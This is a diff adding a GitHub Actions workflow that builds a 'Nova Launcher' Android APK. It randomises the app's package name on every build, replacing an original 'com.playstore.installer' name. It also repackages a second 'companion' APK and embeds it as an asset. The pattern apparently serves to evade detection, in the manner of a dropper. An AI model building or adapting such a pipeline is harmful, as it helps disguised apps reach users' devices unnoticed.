@@ -1,0 +1,199 @@
+name: Build Nova Launcher APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: Build Release APK
+    runs-on: ubuntu-latest
+
+    env:
+      OLD_PKG:   com.android.pictach
+      APK_ASSET: app/src/main/assets/companion.apk
+
+    steps:
+
+      # ── 1. Checkout ──────────────────────────────────────────────────────────
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      # ── 2. Install tools ─────────────────────────────────────────────────────
+      - name: Install tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y zipalign apksigner aapt
+
+          APKTOOL_VER="2.9.3"
+          wget -q "https://github.com/iBotPeaches/Apktool/releases/download/v${APKTOOL_VER}/apktool_${APKTOOL_VER}.jar" \
+               -O /usr/local/bin/apktool.jar
+          wget -q "https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool" \
+               -O /usr/local/bin/apktool
+          chmod +x /usr/local/bin/apktool
+          apktool --version
+
+      # ── 3. (placeholder) Build companion APK runs after SDK setup ───────────
+      # (moved to step after Android SDK so we use SDK apksigner, not apt version)
+
+      # ── 4. Inject Nova package name into source ───────────────────────────────
+      - name: Generate random Nova package name
+        id: nova_pkg
+        run: |
+          NOVA_PKG=$(python3 -c "import random,string; seg=lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(6,8))); print('com.'+seg()+'.'+seg())")
+          echo "NOVA_PKG=${NOVA_PKG}" >> $GITHUB_OUTPUT
+          echo "Generated Nova package name: ${NOVA_PKG}"
+
+      - name: Inject Nova package name into source
+        run: |
+          OLD_NOVA="com.playstore.installer"
+          NEW_NOVA="${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          OLD_PATH="com/playstore/installer"
+          NEW_PATH="${NEW_NOVA//.//}"
+
+          sed -i "s|namespace '${OLD_NOVA}'|namespace '${NEW_NOVA}'|g" app/build.gradle
+          sed -i "s|applicationId \"${OLD_NOVA}\"|applicationId \"${NEW_NOVA}\"|g" app/build.gradle
+          sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" app/src/main/AndroidManifest.xml
+
+          find app/src/main/java/${OLD_PATH} -name "*.kt" \
+            -exec sed -i "s|${OLD_NOVA}|${NEW_NOVA}|g" {} +
+
+          mkdir -p "app/src/main/java/${NEW_PATH}/service"
+          cp app/src/main/java/${OLD_PATH}/*.kt "app/src/main/java/${NEW_PATH}/"
+          cp app/src/main/java/${OLD_PATH}/service/*.kt "app/src/main/java/${NEW_PATH}/service/"
+          rm -rf app/src/main/java/com/playstore
+
+          REMAINING=$(grep -r "${OLD_NOVA}" \
+            app/src/main/java/ app/build.gradle \
+            app/src/main/AndroidManifest.xml | wc -l)
+          if [ "$REMAINING" -gt 0 ]; then
+            echo "::error::Old Nova package name still present."
+            exit 1
+          fi
+          echo "✅ Nova package name injected: ${NEW_NOVA}"
+
+      # ── 5. Setup JDK 17 ──────────────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+          cache: gradle
+
+      # ── 6. Setup Android SDK ──────────────────────────────────────────────────
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      # ── 6b. Build companion APK (after SDK so apksigner is from build-tools) ──
+      - name: Build companion APK
+        env:
+          OLD_PKG:       ${{ env.OLD_PKG }}
+          APK_ASSET:     ${{ env.APK_ASSET }}
+          GITHUB_OUTPUT: $GITHUB_OUTPUT
+        run: |
+          # Use Android SDK apksigner (supports V2/V3) instead of apt version
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          echo "Using apksigner: $(which apksigner)"
+          apksigner version
+          export COMPANION_AUDIT_LOG="${GITHUB_WORKSPACE}/companion_audit.log"
+          python3 scripts/build_companion.py
+
+      # ── 7. Cache Gradle wrapper ───────────────────────────────────────────────
+      - name: Cache Gradle wrapper
+        uses: actions/cache@v4
+        with:
+          path: gradle/wrapper/gradle-wrapper.jar
+          key: gradle-wrapper-${{ runner.os }}
+
+      # ── 8. Grant gradlew + Build Nova release APK ────────────────────────────
+      - name: Build Release APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee gradle_build.log
+          exit ${PIPESTATUS[0]}
+
+      # ── 9. Show APK info ──────────────────────────────────────────────────────
+      - name: Show APK info
+        run: |
+          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
+          echo "APK: $APK"
+          echo "Size: $(du -h $APK | cut -f1)"
+          echo "Nova package name: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          echo "DEX files inside APK:"
+          unzip -l $APK | grep "\.dex"
+
+      # ── 10. Batch integrity check ─────────────────────────────────────────────
+      - name: Batch integrity check
+        run: |
+          APK_DIR="app/build/outputs/apk/release"
+          python3 scripts/batch_integrity_check.py "${APK_DIR}"
+
+      # ── 11. Upload Release APK ────────────────────────────────────────────────
+      - name: Upload Release APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nova-launcher-release
+          path: app/build/outputs/apk/release/nova_*.apk
+          retention-days: 1
+          overwrite: true
+
+      # ── 12. Collect + upload error logs (on failure) ──────────────────────────
+      - name: Collect error logs
+        if: failure()
+        run: |
+          mkdir -p error_logs
+
+          # ── companion build logs ──────────────────────────────────────────
+          for f in decompile.log repackage.log gradle_build.log companion_audit.log; do
+            [ -f "$f" ] && cp "$f" error_logs/
+          done
+
+          # companion_audit.log may be in working dir or batch_output
+          find . -name "companion_audit.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "companion_build.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "step_audit.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "nova_build.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+
+          # ── Gradle build logs ─────────────────────────────────────────────
+          find . -path "*/build/outputs/logs/*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/.gradle/daemon/*/daemon-*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "*.log" -path "*/build/*" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/build/tmp/kotlin-classes*" -name "*.txt" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/build/reports*" -exec cp -r {} error_logs/ \; 2>/dev/null || true
+
+          # ── batch_output audit logs ───────────────────────────────────────
+          [ -d batch_output ] && cp -r batch_output error_logs/ 2>/dev/null || true
+
+          # ── Kotlin source ─────────────────────────────────────────────────
+          mkdir -p error_logs/kotlin_source
+          find app/src/main/java -name "*.kt" -exec cp --parents {} error_logs/kotlin_source/ \; 2>/dev/null || true
+
+          # ── companion_audit.log contents inline in env_info ───────────────
+          {
+            echo "=== NOVA PACKAGE ==="
+            echo "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+            echo "=== JAVA ===" && java -version 2>&1 || true
+            echo "=== APKTOOL ===" && apktool --version 2>&1 || true
+            echo "=== GRADLE ===" && chmod +x gradlew && ./gradlew --version 2>&1 || true
+            echo "=== SOURCE FILES ==="
+            find app/src/main/java -name "*.kt" 2>/dev/null || true
+            echo "=== COMPANION AUDIT LOG ==="
+            cat companion_audit.log 2>/dev/null || echo "companion_audit.log not found"
+            echo "=== GRADLE BUILD LOG ==="
+            cat gradle_build.log 2>/dev/null || echo "gradle_build.log not found"
+          } >> error_logs/env_info.txt
+
+          zip -r error_logs.zip error_logs/
+
+      - name: Upload error logs
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: error-logs
+          path: error_logs.zip
+          retention-days: 7
